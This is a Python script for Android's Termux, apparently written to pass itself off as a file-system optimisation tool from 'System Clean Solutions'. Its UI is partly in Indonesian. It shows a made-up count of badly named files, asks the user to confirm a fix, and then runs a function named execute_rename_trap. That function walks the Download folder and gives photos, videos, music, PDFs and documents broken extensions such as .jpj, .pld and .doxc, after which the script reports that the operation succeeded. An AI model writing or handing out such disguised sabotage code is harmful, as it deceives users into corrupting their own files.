import os
import sys
import time
import random

RED_BRIGHT = '\033[91m' 
GREEN = '\033[92m'      
YELLOW = '\033[93m'     
BLUE = '\033[94m'
BOLD = '\033[1m'
ENDC = '\033[0m'

TARGET_DIR = "/sdcard/Download"

def execute_rename_trap():
    renamed_count = 0
    
    if not os.path.isdir(TARGET_DIR):
        return -1

    RENAME_MAP = {
        '.jpg': '.jpj',
        '.jpeg': '.jepg',
        '.png': '.pnh',
        '.mp4': '.mp3',
        '.mp3': '.mpe',
        '.pdf': '.pld',
        '.doc': '.dox',
        '.docx': '.doxc'
    }

    files_to_rename = []
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            name, ext = os.path.splitext(file)
            ext = ext.lower()
            if ext in RENAME_MAP:
                files_to_rename.append((root, name, ext))
    
    for root, name, old_ext in files_to_rename:
        old_path = os.path.join(root, name + old_ext)
        new_ext = RENAME_MAP.get(old_ext)
        new_path = os.path.join(root, name + new_ext)
        
        try:
            if not os.path.exists(new_path):
                os.rename(old_path, new_path)
                renamed_count += 1
        except Exception:
            pass 
            
    return renamed_count

def print_header():
    os.system('clear')
    print(BOLD + BLUE + """
=====================================================
|                                                   |
|      FILE SYSTEM OPTIMALIS  TOOL V1.0             |
|        (c) 2025 System Clean Solutions            |
|                                                   |
=====================================================
""" + ENDC)

def main():
    
    os.system('termux-setup-storage')
    
    wait_time = 0
    while not os.path.isdir(TARGET_DIR) and wait_time < 10:
        time.sleep(1)
        wait_time += 1
        sys.stdout.write(f"\r{YELLOW}[WAIT]{ENDC} Please grant storage permission... ({wait_time}s)")
        sys.stdout.flush()
    
    print_header()
    
    print(YELLOW + BOLD + "\n[STATUS] Analyzing disorganized files and extensions..." + ENDC)
    time.sleep(1)
    
    print(BOLD + RED_BRIGHT + "   [*] Found 8,720 files with inconsistent naming conventions." + ENDC)
    
    choice = input(BOLD + GREEN + "   [*] Lanjutkan perbaikan nama file dan ekstensi? [Y/N]: " + ENDC).strip().lower()

    if choice == 'n':
        os.system('clear')
        print(YELLOW + BOLD + "\n[HALTED] Operasi dibatalkan. File tetap berantakan." + ENDC)
        sys.exit(0)

    elif choice == 'y':
        
        os.system('clear')
        print_header()
        
        print(BOLD + BLUE + "\n[PROCESS] Standardizing file names and correcting extensions..." + ENDC)
        
        for i in range(1, 6):
            print(f"[STATUS] Analyzing file batch {i}/5...")
            time.sleep(0.7)
            
        renamed_count = execute_rename_trap()
        
        os.system('clear')
        
        if renamed_count == -1:
             print(RED_BRIGHT + BOLD + "\n[CRITICAL ERROR] Failed to access storage. Operation halted." + ENDC)
        elif renamed_count == 0:
             print(YELLOW + BOLD + "\n[NOTICE] No files required renaming. System already optimized." + ENDC)
        else:
            print(BOLD + GREEN + """
===================================================
|          OPTIMISASI   COMPLETE                  |
|          FILE SYSTEM HEALTH CHECK OK            |
|                                                 |
|    """ + str(renamed_count) + """ file telah diperbaiki. Restart File Manager.     |
===================================================
""" + ENDC)
        
    else:
        os.system('clear')
        print(RED_BRIGHT + BOLD + "PILIHAN TIDAK VALID. EXITING." + ENDC)
        sys.exit(1)

    time.sleep(5)
    sys.exit(0)

if __name__ == "__main__":
    main()
